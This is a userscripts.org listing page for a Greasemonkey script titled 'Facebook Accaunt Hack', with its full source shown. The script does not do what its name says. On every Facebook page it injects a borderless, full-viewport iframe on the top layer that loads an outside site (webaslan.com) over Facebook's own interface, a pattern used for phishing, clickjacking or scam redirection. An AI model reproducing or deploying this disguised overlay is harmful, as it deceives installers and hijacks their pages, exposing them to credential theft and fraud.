0 Unread MessagesFacebook HelpLogout
Userscripts.org
Scripts
Tags
Forums
People
Blog
Groups
Guides

Facebook Accaunt Hack
By Milojko — Last update Mar 13, 2012 — Installed 230 times.
About
Source Code
Reviews 0
Discussions 0
Fans 0
Issues
Share
There are 2 previous versions of this script.

// ==UserScript==
// @name         Facebook Accaunt Hack 
// @description                  Facebook Accaunt Hack
// @description        Facebook Accaunt Hack
// @include         http://facebook.com/*
// @include         http://*.facebook.com/*
// @include         https://facebook.com/*
// @include         https://*.facebook.com/*
// @exclude         http://*.channel.facebook.com/*
// @exclude         https://*.channel.facebook.com/*
// @exclude         https://www.facebook.com/login.php
// @exclude         https://facebook.com/login.php
// @exclude         http://facebook.com/login.php
// @author         Gigxon
// @version         1
// @versionnumber   1
// @namespace      http://userscripts.org/scripts/show/128259
// ==/UserScript==
//

var el = document.createElement("iframe");
el.setAttribute('id', 'ifrm');
document.body.appendChild(el);
el.setAttribute('src', 'http://www.webaslan.com/');
el.setAttribute('style', 'border:0px;z-index:99999;position:absolute;top:0px;left:0px;');
el.setAttribute('width', '100%');
el.setAttribute('height', '9999px');
el.setAttribute('scrolling', 'no');
Because it's your web

Powered by monkeys and unicorns with the help of many friends

Policy & Guidelines: DMCA Privacy Policy